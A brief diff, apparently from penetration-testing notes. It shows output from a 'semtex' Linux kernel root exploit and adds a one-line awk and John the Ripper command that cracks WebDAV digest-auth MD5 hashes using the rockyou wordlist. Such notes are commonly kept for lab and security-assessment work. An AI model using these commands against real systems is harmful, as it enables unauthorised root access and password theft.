@@ -10,3 +10,6 @@ bash-4.1$ ./semtex
 2.6.37-3.x x86_64  
 sd@fucksheep.org 2010  
 -sh-4.1#  
+
+## awk
+awk '{print "admin:XAMPP with WebDAV:" $0}' /usr/share/wordlists/rockyou.txt | john hashes.txt --format=raw-md5 --pipe  
